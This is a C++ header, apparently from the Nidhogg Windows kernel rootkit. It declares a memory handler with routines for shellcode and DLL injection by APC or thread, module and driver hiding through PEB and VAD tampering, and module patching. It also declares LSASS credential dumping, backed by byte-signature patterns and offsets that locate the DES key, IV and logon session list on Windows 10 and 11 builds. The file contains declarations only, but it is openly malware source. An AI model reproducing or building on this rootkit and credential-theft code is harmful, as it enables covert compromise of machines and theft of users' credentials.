#pragma once

#include "pch.h"
#include "IoctlShared.h"
#include "MemoryHelper.h"

extern "C" {
	#include "WindowsTypes.h"
	#include "NidhoggCommon.h"
}
#include "ProcessHelper.h"
#include "FileHelper.h"
#include "MemoryAllocator.hpp"
#include "ListHelper.hpp"

// Definitions.
constexpr SIZE_T NO_ACCESS = 0;
constexpr SIZE_T PATH_OFFSET = 0x190;
constexpr SIZE_T ALERTABLE_THREAD_FLAG_BIT = 0x10;
constexpr SIZE_T ALERTABLE_THREAD_FLAG_OFFSET = 0x74;
constexpr SIZE_T GUI_THREAD_FLAG_BIT = 0x80;
constexpr SIZE_T GUI_THREAD_FLAG_OFFSET = 0x78;
constexpr SIZE_T THREAD_KERNEL_STACK_OFFSET = 0x58;
constexpr SIZE_T THREAD_CONTEXT_STACK_POINTER_OFFSET = 0x2C8;
constexpr ULONG DES_KEY_TAG1 = 'UUUR';
constexpr ULONG DES_KEY_TAG2 = 'MSSK';
constexpr UCHAR VPN_SHIFT = 32;

constexpr UCHAR IvDesKeyLocation[] = { 0x33, 0xC0, 0x48, 0x8D, 0x15, 0xCC, 0xCC, 0xCC, 0x00, 0x21, 0x45 };
constexpr Pattern IvDesKeyLocationPattern = {
	{WIN_1507, WIN_11_24H2}, sizeof(IvDesKeyLocation), IvDesKeyLocation, 0xCC, 0, false
};

constexpr UCHAR LogonSessionListPattern24H2[] = { 0xCC, 0xC1, 0xCC, 0x04 };
constexpr UCHAR LogonSessionListPattern23H2[] = { 0x33, 0xC0, 0x48, 0x8D };
constexpr Pattern LogonSessionListPatterns[] = {
	{{WIN_1507, WIN_20H2}, sizeof(LogonSessionListPattern24H2), LogonSessionListPattern24H2, 0xCC, 7, false},
	{{WIN_11_24H2, WIN_11_24H2}, sizeof(LogonSessionListPattern24H2), LogonSessionListPattern24H2, 0xCC, -5, false},
	{{WIN_21H1, WIN_11_23H2}, sizeof(LogonSessionListPattern23H2), LogonSessionListPattern23H2, 0xCC, 5, false}
};
constexpr SIZE_T LogonSessionListPatternCount = sizeof(LogonSessionListPatterns) / sizeof(Pattern);

constexpr UCHAR LogonSessionListCountPattern24H2[] = { 0x41, 0x8B, 0xCC, 0x3B };
constexpr UCHAR LogonSessionListCountPattern23H2[] = { 0x83, 0x65, 0x38, 0x00 };
constexpr UCHAR LogonSessionListCountPattern20H2[] = { 0x00, 0x00, 0x44, 0x39 };
constexpr Pattern LogonSessionListCountPatterns[] = {
	{{WIN_1507, WIN_20H2}, sizeof(LogonSessionListCountPattern20H2), LogonSessionListCountPattern20H2, 0xCC, 6, false},
	{{WIN_21H1, WIN_11_23H2}, sizeof(LogonSessionListCountPattern23H2), LogonSessionListCountPattern23H2, 0xCC, 5, false},
	{{WIN_11_24H2, WIN_11_24H2}, sizeof(LogonSessionListCountPattern24H2), LogonSessionListCountPattern24H2, 0xCC, 5, false}
};

constexpr UCHAR IvSignature[] = { 0x44, 0x8B, 0xC6, 0x48, 0x8D, 0x15 };
constexpr Pattern IvSignaturePattern = {
	{WIN_1507, WIN_11_24H2}, sizeof(IvSignature), IvSignature, 0xCC, 6, false
};
constexpr UCHAR DesKeySignature[] = { 0x44, 0x8B, 0x4D, 0xD4, 0x48, 0x8D, 0x15 };
constexpr Pattern DesKeySignaturePattern = {
	{WIN_1507, WIN_11_24H2}, sizeof(DesKeySignature), DesKeySignature, 0xCC, 7, false
};
constexpr SIZE_T DesKeyStructOffset = 0xB;
constexpr SIZE_T LsaInitializeProtectedMemoryDistance = 0x310;
constexpr SIZE_T LogonSessionListDistance = 0x310;
constexpr SIZE_T IvDesKeyLocationDistance = 0x82A6F;

struct PebLinks {
	LIST_ENTRY InLoadOrderLinks;
	LIST_ENTRY InInitializationOrderLinks;
	LIST_ENTRY InMemoryOrderLinks;
	LIST_ENTRY HashLinks;
};

struct HiddenModuleEntry {
	LIST_ENTRY Entry;
	wchar_t* ModuleName;
	ULONG Pid;
	PebLinks Links;
	PLIST_ENTRY OriginalEntry;
	PMMVAD_SHORT VadNode;
	wchar_t* VadModuleName;
	ULONG OriginalVadProtection;
};

struct HiddenDriverEntry {
	LIST_ENTRY Entry;
	wchar_t DriverPath[MAX_PATH];
	PKLDR_DATA_TABLE_ENTRY OriginalEntry;
};

struct HiddenItemsList {
	SIZE_T Count;
	FastMutex Lock;
	PLIST_ENTRY Items;
};

struct LsassInformation {
	FastMutex Lock;
	KeyInformation DesKey;
	KeyInformation Iv;
	SIZE_T Count;
	IoctlCredentials* Creds;
};

struct LsassMetadata {
	FastMutex Lock;
	bool Collected;
	PLIST_ENTRY LogonSessionList;
	PBCRYPT_GEN_KEY DesKey;
	PVOID IvAddress;
};

// General functions.
VOID ApcInjectionCallback(PKAPC Apc, PKNORMAL_ROUTINE* NormalRoutine, PVOID* NormalContext, PVOID* SystemArgument1, PVOID* SystemArgument2);
VOID PrepareApcCallback(PKAPC Apc, PKNORMAL_ROUTINE* NormalRoutine, PVOID* NormalContext, PVOID* SystemArgument1, PVOID* SystemArgument2);


class MemoryHandler {
private:
	HiddenItemsList hiddenDrivers;
	HiddenItemsList hiddenModules;
	LsassInformation cachedLsassInfo;
	LsassMetadata lsassMetadata;

	_IRQL_requires_max_(APC_LEVEL)
	ULONG GetPageCommitmentLockOffset() const;

	_IRQL_requires_max_(APC_LEVEL)
	ULONG GetVadRootOffset() const;

	_IRQL_requires_max_(DISPATCH_LEVEL)
	bool FindHiddenDriver(_In_ wchar_t* driverPath, _Out_opt_ HiddenDriverEntry** driverEntry = nullptr) const;

	_IRQL_requires_max_(APC_LEVEL)
	bool AddHiddenDriver(_Inout_ HiddenDriverEntry& item);

	_IRQL_requires_max_(APC_LEVEL)
	bool AddHiddenModule(_Inout_ HiddenModuleEntry& item);
	
	_IRQL_requires_max_(APC_LEVEL)
	NTSTATUS VadHideObject(_Inout_ PEPROCESS process, _In_ ULONG_PTR targetAddress, _Inout_ HiddenModuleEntry& moduleEntry);

	_IRQL_requires_max_(DISPATCH_LEVEL)
	NTSTATUS VadRestoreObject(_Inout_ PEPROCESS process, _In_ PMMVAD_SHORT vadNode, _In_opt_ wchar_t* moduleName = nullptr, 
		_In_opt_ ULONG vadProtection = 0);

	_IRQL_requires_max_(DISPATCH_LEVEL)
	TABLE_SEARCH_RESULT VadFindNodeOrParent(_In_ PRTL_AVL_TABLE table, _In_ ULONG_PTR targetPageAddress, 
		_Inout_ EX_PUSH_LOCK* pageTableCommitmentLock, _Out_ PRTL_BALANCED_NODE* outNode);

	_IRQL_requires_max_(APC_LEVEL)
	PETHREAD FindAlertableThread(_In_ HANDLE pid);

	_IRQL_requires_max_(APC_LEVEL)
	NTSTATUS RestorePebModule(_In_ PEPROCESS& process, _In_ HiddenModuleEntry* moduleEntry);

	_IRQL_requires_max_(APC_LEVEL)
	NTSTATUS RestoreModule(_In_ HiddenModuleEntry* moduleEntry);

	_IRQL_requires_max_(APC_LEVEL)
	NTSTATUS GetLsassMetadata(_Inout_ PEPROCESS& lsass);

public:
	void* operator new(size_t size) {
		return AllocateMemory<PVOID>(size, false);
	}

	void operator delete(void* p) {
		if (p)
			ExFreePoolWithTag(p, DRIVER_TAG);
	}
	_IRQL_requires_max_(APC_LEVEL)
	MemoryHandler();

	_IRQL_requires_max_(APC_LEVEL)
	~MemoryHandler();

	_IRQL_requires_max_(APC_LEVEL)
	NTSTATUS PatchModule(_In_ IoctlPatchedModule& moduleInformation);

	_IRQL_requires_max_(APC_LEVEL)
	NTSTATUS InjectShellcodeAPC(_In_ IoctlShellcodeInfo& shellcodeInformation, _In_ bool isInjectedDll = false);

	_IRQL_requires_max_(APC_LEVEL)
	NTSTATUS InjectShellcodeThread(_In_ IoctlShellcodeInfo& shellcodeInfo) const;

	_IRQL_requires_max_(APC_LEVEL)
	NTSTATUS InjectDllThread(_In_ IoctlDllInfo& dllInfo) const;

	_IRQL_requires_(PASSIVE_LEVEL)
	NTSTATUS InjectDllAPC(_In_ IoctlDllInfo& dllInfo);

	_IRQL_requires_max_(APC_LEVEL)
	NTSTATUS HideModule(_In_ IoctlHiddenModuleInfo& moduleInformation);

	_IRQL_requires_max_(APC_LEVEL)
	NTSTATUS RestoreModule(_In_ IoctlHiddenModuleInfo& moduleInformation);

	_IRQL_requires_max_(APC_LEVEL)
	void RestoreModules(_In_ ULONG pid);

	_IRQL_requires_max_(APC_LEVEL)
	HiddenModuleEntry* FindHiddenModule(_In_ IoctlHiddenModuleInfo& info) const;

	_IRQL_requires_max_(APC_LEVEL)
	HiddenModuleEntry* FindHiddenModule(_In_ HiddenModuleEntry& info) const;

	_IRQL_requires_max_(APC_LEVEL)
	NTSTATUS HideDriver(_In_ wchar_t* driverPath);

	_IRQL_requires_max_(APC_LEVEL)
	NTSTATUS UnhideDriver(_In_ wchar_t* driverPath);

	_IRQL_requires_max_(APC_LEVEL)
	NTSTATUS DumpCredentials(_Out_ SIZE_T* allocationSize);

	_IRQL_requires_max_(APC_LEVEL)
	NTSTATUS GetCredentials(_Inout_ IoctlCredentialsInformation* credentials);
};

inline MemoryHandler* NidhoggMemoryHandler;
